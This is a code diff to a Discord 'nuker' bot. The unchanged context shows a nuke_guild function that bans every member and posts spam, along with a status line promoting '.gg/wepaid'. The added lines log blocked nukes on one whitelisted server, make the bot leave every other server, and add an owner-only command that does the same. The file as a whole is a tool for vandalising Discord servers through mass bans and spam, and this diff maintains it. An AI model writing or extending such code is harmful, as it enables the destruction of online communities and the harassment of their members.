@@ -102,6 +102,7 @@ WHITELISTED_SERVER_ID = 1453064260555903225
 
 async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
     if guild.id == WHITELISTED_SERVER_ID:
+        print(f"{g}[+] Nuke attempted on whitelisted server {guild.name} ({guild.id}) - Blocked.")
         return
     msg = custom_message or SPAM_MESSAGE
     await ban_all_members(guild)
@@ -144,13 +145,32 @@ async def on_ready():
     )
     await client.change_presence(activity=activity)
     
+    # Auto-leave non-whitelisted guilds
+    for guild in client.guilds:
+        if guild.id != WHITELISTED_SERVER_ID:
+            try:
+                await guild.leave()
+                print(f"{r}[!] Left non-whitelisted guild: {guild.name} ({guild.id})")
+            except Exception as e:
+                print(f"{r}[!] Failed to leave guild {guild.name}: {e}")
+    
     print(f'''
 {c}--------------------------------------------
 {g}[+] Logged in as {client.user}
 {y}[!] Slash Commands Enabled
 {y}[!] Status: Streaming .gg/wepaid JOIN NOW
+{y}[!] Whitelisted Server: {WHITELISTED_SERVER_ID}
 {c}--------------------------------------------''')
     asyncio.create_task(check_logs_task())
+
+@client.event
+async def on_guild_join(guild):
+    if guild.id != WHITELISTED_SERVER_ID:
+        try:
+            await guild.leave()
+            print(f"{r}[!] Left unauthorized guild: {guild.name} ({guild.id})")
+        except Exception as e:
+            print(f"{r}[!] Failed to leave unauthorized guild {guild.name}: {e}")
 
 async def check_logs_task():
     while True:
@@ -231,6 +251,26 @@ async def check_logs_task():
         except Exception as e:
             print(f"Log Task Error: {e}")
         await asyncio.sleep(5)
+
+@client.tree.command(name="leave_all", description="Leave all servers except the whitelisted one (Owner Only)")
+async def leave_all_slash(interaction: discord.Interaction):
+    if not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
+    
+    await interaction.response.send_message("👋 Leaving all unauthorized servers...", ephemeral=True)
+    
+    left_count = 0
+    fail_count = 0
+    
+    for guild in client.guilds:
+        if guild.id != WHITELISTED_SERVER_ID:
+            try:
+                await guild.leave()
+                left_count += 1
+            except:
+                fail_count += 1
+                
+    await interaction.followup.send(f"✅ Finished! Left {left_count} servers. Failed: {fail_count}", ephemeral=True)
 
 # --- Ticket System ---
 
